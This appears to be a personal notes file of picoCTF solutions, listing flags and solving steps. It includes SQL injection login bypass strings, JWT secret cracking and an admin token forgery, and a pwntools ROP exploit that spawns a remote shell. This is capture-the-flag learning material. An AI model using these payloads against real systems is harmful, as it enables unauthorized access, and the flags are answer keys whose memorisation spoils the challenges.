1. shark on wire 1 -> picoCTF{StaT31355_636f6e6e}
2. shark on wire 2 -> picoCTF{p1LLf3r3d_data_v1a_st3g0}
   1. picoiafda6f6e
   2. kfdsalkfsalkico{N0t_a_fLag}
   3. icoCTF{StaT31355e_
   4. picoCTF{StaT31355e_fda6f6e}
   5. picoCTF{StaT31355e_36}
   6. _
   7. 36
   8. }
   9. picoCTF{p1LLf3r3d_data_v1a_st3g0}

3. 1_wanna_b3_a_r0ck5tar ->   picoCTF{BONJOVI}
   1. mlitjssbs

4. like1000 -> picoCTF{l0t5_0f_TAR5}
5. Irish-Name-Repo 1 -> picoCTF{s0m3_SQL_85832275}
   </b>:  Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:18
   Stack trace:
   #0 {main}
   thrown in <b>/var/www/html/login.php</b>z

   1. username=admin' OR'1'='1&password=password123&debug=0
   2. Your flag is: picoCTF{s0m3_SQL_85832275}

6. vault-door-1 -> picoCTF{d35cr4mbl3_tH3_cH4r4cT3r5_7ffa94}
7. vault-door-3 -> picoCTF{jU5t_a_s1mpl3_an4gr4m_4_u_e60bc2}
8. vault-door-4 -> picoCTF{jU5t_4_bUnCh_0f_bYt3s_e021387213}
9. vault-door-5 -> picoCTF{c0nv3rt1ng_fr0m_ba5e_64_4185551e}
   1.  JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVmJTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2JTM0JTVmJTM0JTMxJTM4JTM1JTM1JTM1JTMxJTY1
   2.  from base64: %63%30%6e%76%33%72%74%31%6e%67%5f%66%72%30%6d%5f%62%61%35%65%5f%36%34%5f%34%31%38%35%35%35%31%65
   3. URL decode:  c0nv3rt1ng_fr0m_ba5e_64_4185551e

10. vault-door-6 -> picoCTF{n0t_mUcH_h4rD3r_tH4n_x0r_faae8b4}

01010101 -> 0x55
00111011 -> 0x3b
--------
01101110 -> n

11. Client-side-again -> picoCTF{not_this_again_4daf93}
12. Irish-Name-Repo 2 -> picoCTF{m0R3_SQL_plz_8c334129}
    1.  username=admin' OR'1'='1&password=password123&debug=0 -> not working
    2.  username=admin'--&password=anything&debug=0

13. Irish-Name-Repo 3 -> picoCTF{3v3n_m0r3_SQL_2af58a67} 
    1. SQL injection but ROT 13 the injection since it gets changed before read by SQL:   
       1. password=' BE 1=1--&debug=1   because BE = OR with ROT13

14. c0rrupt -> picoCTF{c0rrupt10n_1847995}
15. WhitePages -> picoCTF{not_all_spaces_are_created_equal_983fa43f23feeae01adc4cbf26e51fc5}
```bash
#!/usr/bin/env bash

python3 - <<'PY'
from pathlib import Path

data = Path("whitepages.txt").read_text(encoding="utf-8")

bits = data.replace("\u2003", "0").replace(" ", "1")

print(bits)
PY
```

16. flag_shop -> picoCTF{m0n3y_bag5_44cFf530}
17. Easy1 -> picoCTF{CRYPTOISFUN}
    1.  SU = C
    2.  OF = R
    3.  LJ = Y
    4.  VK = P
    5.  EX = T
    6.  CQ = O
    7.  RZ = I
    8.  YQ = S
    9.  PU = F
    10. TN = U
    11. OB = N
    12. CRYPTOISFUN

18. Mr-Worldwide -> picoCTF{KODIAK_ALASKA}
    1. 35.028309, 135.753082 = Kyoto, Japan
    2. 46.469391, 30.740883 = Odessa, Ukraine 
    3. 39.758949, -84.191605 = Dayton, USA
    4. 41.015137, 28.979530 = Istanbul, Turkey
    5. 24.466667, 54.366669 = Abu Dhabi, UAE
    6. 3.140853, 101.693207 = Kuala Lumput, Malaysia
    7. _
    8. 9.005401, 38.763611 = Addos Ababa, Ethiopia
    9. -3.989038, -79.203560 = Loja, Ecuador
    10. 52.377956, 4.897070 = Amsterdam, Netherlands
    11. 41.085651, -73.858467 = Sleepy Hollow, USA
    12. 57.790001, -152.407227 = Kodiak, Alaska, USA
    13. 31.205753, 29.924526 = ALexandria, Egypt
        1.  picoCTF{KODIADKL_AALASHKA}
        2.  picoCTF{JUUTUM_EENUUE}
        3.  picoCTF{KODIAK_ALASKA}

19. waves over lambda -> frequency_is_c_over_lambda_b613e7dd
    1. https://www.guballa.de/substitution-solver

20. Based -> picoCTF{learning_about_converting_values_aa2bA794}
21. Flags -> PICOCTF{F1AG5AND5TUFF}
    1.  picoCTF{f?ag?and?tuff}
    2.  picoCTF{f200ag100and100tuff}
    3.  picoCTF{flag_and_tuff}
    4.  picoCTF{flag_and_stuff}
    5.  picoCTF{flag_andstuff}
    6.  picoCTF{fsagmandmtuff}
    7.  PICOCTF{F1AG_AND_5TUFF}
    8.  PICOCTF{F1AG5AND5TUFF}

22. m00nwalk -> picoCTF{beep_boop_im_in_space}
    - git clone https://github.com/colaclanth/sstv.git
    - cd sstv
    - python3 -m venv venv
    - source venv/bin/activate
    - pip install -U pip
    - pip install .
    - sstv -d ~/Documents/git_hub/ctf/cylabacademy/challenge-lib/medium/message.wav \
    - picoCTF{beep_boop_im_in_space}

23. JaWT Scratchpad ->
    - eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y
  
    - Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
        {
          "typ": "JWT",
          "alg": "HS256"
        }

    - Payload: eyJ1c2VyIjoiam9obiJ9 
        {
          "user": "john"
        }

    - Signature: _fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y
        this is the result of: 
            HMACSHA256( Base64Url(header) + "." + Base64Url(payload), secret )
            then combined with a secret to form: _fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y

jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.WZ4kQqx55FHtBkGrN6lwtYR-_F9ANbgQUKRCAPIf_7Q;
Path=/

- hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --show
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y:ilovepico

- JWT with ilovepico:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.AMuH3A1TJcRUktdMkvEvVsbSJKJyf5oRglFMVGZuXz0

Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
- picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}

-------------------------------------
first cookie:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y

Header: 
{
  : "JWT",
  : "HS256"
}
Payload:
{
  "user": "john"
}
Secret/Signature: 
ilovepico



add "admin" as user payload value together with "ilovepico" and convert to jwt token:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s

send with GET in burp:
picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}

23. Tapping -> 
.--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. ---.. .- .- -.... ..--- -.. -.-. .- }
PICOCTF{M0RS3C0D31SFUN8AA62DCA}
--------------------
24. asm1 -> 
0xe26 = 3622
3622 - 19 = 3603
flag: 0xe13
------------------------
25. so meta -> 
picoCTF{s0_m3ta_b309a657}
-------------------------
26. music 
114 114 114 111 99 107 110 114 110 48 49 49 51 114
rrrocknrn0113r
picoCTF{rrrocknrn0113r}
-------------------------
27. picobrowser -> 
change user-agent in burp suite to "picobrowser"
picoCTF{p1c0_s3cr3t_ag3nt_fba5c48f}
-----------------------------
29. john_pollard -> 
use: https://www.dcode.fr/rsa-cipher and entar certificate, work your way inn.
picoCTF{73176001,67867967}
----------------------------
30. la cifra de
picoCTF{b311a50_0r_v1gn3r3_c1ph3rdAAB11d9}
using: https://cryptii.com/pipes/vigenere-cipher/
----------------
31. Nothing Up My Sleeve
picoCTF{c0ngr4ts_0n_y0ur_s4n1ty}
-------------
32. Guessing Game 1

gdb ./vuln
run

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400c9b in win ()



(gdb) info registers
rax            0x160               352
rbx            0x400400            4195328
rcx            0x0                 0
rdx            0x6bcdf0            7065072
rsi            0x0                 0
rdi            0x1                 1
rbp            0x6161616161616161  0x6161616161616161
rsp            0x7fffffffdc18      0x7fffffffdc18
r8             0x160               352
r9             0x160               352
r10            0xfffffeab          4294966955
r11            0x246               582
r12            0x401aa0            4201120
r13            0x0                 0
r14            0x6ba018            7053336
r15            0x0                 0
rip            0x400c9b            0x400c9b <win+75>
eflags         0x10202             [ IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x6be880            7071872
gs_base        0x0                 0



└─$ checksec --file=./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified  Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   1847 Symbols      No    0 0./vuln


input:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

script.py:
from pwn import *

HOST = "shape-facility.picoctf.net"
PORT = 54725   # use the port shown on your challenge page

pop_rdi = 0x4006a6
pop_rax = 0x4005af
pop_rsi = 0x410b93
pop_rdx = 0x410602
syscall = 0x40138c
bss = 0x6bc3a0
write_gadget = 0x447abb

payload = b"A" * 120
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + b"/bin/sh\x00"
payload += p64(write_gadget)
payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)

io = remote(HOST, PORT)

io.recvuntil(b"guess?")
io.sendline(b"84")

io.recvuntil(b"Name?")
io.sendline(payload)

io.interactive()


when get shell, run:
ls
cat flag.txt

picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b60859a7b4193d0e}

---------------------------------
32. Guessing Game 1 (remaster)

```bash
└─$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=670139b05b438fbd512de3e3a3bf2715f295cbbc, not stripped

┌──(kali㉿jrpc)-[~/Documents/git_hub/ctf/cylabacademy/challenge-lib/medium]
└─$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified  Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   1847 Symbols      No    0 0vuln
```

create a copy for overflowing the buffer since:
```bash
#define BUFSIZE 100

long get_random() {
	return rand() % BUFSIZE;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}

```
buffersize is 100 and fgets takes up to 360 - so there is a buffer overflow.

in t_vuln.c change main() to look like:
```bash
int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	int res;
	int counter = 0;
	while(counter < 10){	
		res = do_stuff();
		counter++;
	}
	return 0;
}
```

and change do_stuff() to look like:

```bash
int do_stuff() {
	long ans = get_random();
	ans = increment(ans);
	int res = 0;
	
	printf("ANS: %i\n", ans);
	return res;
}
```

this prints: 
└─$ ./t_vuln
ANS: 84
ANS: 87
ANS: 78
ANS: 16
ANS: 94
ANS: 36
ANS: 87
ANS: 93
ANS: 50
ANS: 22

so the number is 84 every time for the first iteration.

create a cyclic pattern to use in input:
└─$ python3 -c 'from pwn import *; print(cyclic(300).decode())'
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

entering the pattern will result in:

Segmentation fault         ./vuln

this is a runtime error that occurs when a program attempts to access or modify a restricted memory area it is not permitted to touch

└─$ ROPgadget --binary vuln > gadgets.txt

in gadgets.txt find:
0x000000000047eafa : adc al, 0 ; add byte ptr [rax], al ; syscall

go to system call tables: https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

%rax	System call	    %rdi	                %rsi	                    %rdx	                    %r10	%r8	%r9
59	    sys_execve	    const char *filename	const char *const argv[]	const char *const envp[]	